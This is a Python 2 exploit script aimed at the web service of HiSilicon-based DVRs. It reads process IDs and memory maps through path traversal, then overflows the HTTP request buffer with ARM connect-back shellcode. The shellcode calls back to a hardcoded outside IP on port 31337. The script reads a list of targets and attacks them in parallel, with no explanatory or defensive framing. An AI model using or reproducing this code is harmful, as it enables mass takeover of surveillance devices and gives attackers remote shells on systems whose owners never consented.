#!/usr/bin/env python2
#
# pwn hisilicon dvr web service

from pwn import *
import socket
from time import sleep
import re
import os
import sys
import argparse
from threading import Thread
from Queue import *
from sys import stdout
from multiprocessing.dummy import Pool
from multiprocessing import Process

in_file = sys.stdin
sofia_cmdline = ["/var/Sofia", "/usr/bin/Sofia"]
lhost = "209.141.40.213"
lport = int(31337)
target_p = 88


def recvall(ss):
    buf = ''
    while True:
        data = ss.recv(4096)
        if data:
            buf += data
        else:
            break
    return buf
def findpid(target_h, target_p):
    newsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    newsock.settimeout(10)
    newsock.connect((target_h, target_p))
    newsock.send('GET ../../proc HTTP\n')
    pids = []
    data = recvall(newsock)
    newsock.close()
    for line in data.splitlines():
        res = re.match(r'.*\.\./\.\./proc/([0-9]+)"', line)
        if res:
            pids.append(int(res.group(1)))
    pid_sofia = None
    pids.sort(reverse=True)
    isBreaking = False
    for pid in pids:
        ff = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ff.settimeout(20)
        ff.connect((target_h, target_p))
        ff.send('GET ../../proc/%d/cmdline HTTP\n' % pid)
        resp = recvall(ff).splitlines()
        ff.close()
        for binary in sofia_cmdline:       
            if binary + '\x00' == resp[-1]:
                pid_sofia = pid
                isBreaking = True
                break
        if(isBreaking):
            break
        
    if not pid_sofia:
        return 0
    return pid_sofia

def guessregion(smaps):
    for t in range(len(smaps)-7, 1, -1):
        if (smaps[t][1][0], smaps[t+1][1][0], smaps[t+2][1][0], smaps[t+3][1][0], smaps[t+4][1][0], smaps[t+5][1][0], smaps[t+6][1][0]) == (8188, 8188, 8188, 8188, 8188, 8188, 8188) and smaps[t][1][1] == 4 and smaps[t+1][1][1] == 4 and smaps[t+2][1][1] == 4 and smaps[t+3][1][1] >= 8 and smaps[t+4][1][1] >= 4 and smaps[t+5][1][1] >= 4 and smaps[t+6][1][1] >= 8:
            return (t+3)
    return (-1)

# getting stack section base address
# 'k' defines the section which contains the stack
def getleak(pid, target_h, target_p):
    newsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    newsock.settimeout(10)
    newsock.connect((target_h, target_p))
    newsock.send('GET ../../proc/%d/smaps HTTP\n' % pid)
    smaps = []
    memStart = False
    for line in recvall(newsock).splitlines():
        if memStart:
            t += (int(line.split()[1]),)
            i += 1
            #if i >= 14:
            if i >= 7:
                smaps.append((memStart, t))
                memStart = False
        if 'rwxp' in line:
            memStart = int(line.split('-')[0], 16)
            i = 0
            t = ()
    guess = guessregion(smaps)
    k = guess
    leak = smaps[k][0]
    newsock.close()
    return leak


# connectback shellcode
# badchars: 0x00, 0x0d, 0x20, 0x3f, 0x26
def shellcode(lhost, lport):
    xscode  = "01108fe211ff"
    xscode += "2fe111a18a78013a8a700221081c0121921a0f02193701df061c0ba10223"
    xscode += "0b801022023701df3e270137c821301c01df0139fbd507a0921ac27105b4"
    xscode += "69460b2701df0121081c01dfc046ffff7a69c0a858642f62696e2f736858"
    xscode += "ffffc046efbeadde"
    
    h = lambda x: hex(int(x))[2:]
    h2 = lambda x: h(x).zfill(2)
    xscode = xscode[:164] + h(lport+0x100).zfill(4) + ''.join(map(h2, lhost.split('.'))) + xscode[176:]
    xscode = xscode.decode('hex')
    return xscode

# REPLACE CONNECTBACK HOST PORT
xscode = shellcode(lhost, lport)
stack_offset = 0x7fd3d8
def exploit(target_h, target_p):
    pid = 0
    h = target_h
    p = target_p
    try:
        pid = findpid(h, p)
    except Exception as e:
        print(e)
        return
    if (pid == 0):
        print("pid was 0")
        return
    stack_section_base = getleak(pid, h, p)
    if (stack_section_base == 0):
        print("could not get leak")
        return
    stack_20 = stack_section_base + stack_offset + 20

    payload  = "GET "
    payload += xscode
    payload += "a" * (299 - len(xscode))
    payload += p32(stack_20)
    payload += " HTTP\n"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(20)
    s.connect((h, p))
    s.send(payload)
    l = len(recvall(s))
    s.close()
    print("[xpl] sent payload to device: {}|{}".format(target_h, l))

print("You should be getting backconnects")
if __name__ == "__main__":
	for i in in_file:
            line = i.strip("\r\n")	
            p = Process(target=exploit, args=(line, target_p))
            p.start()
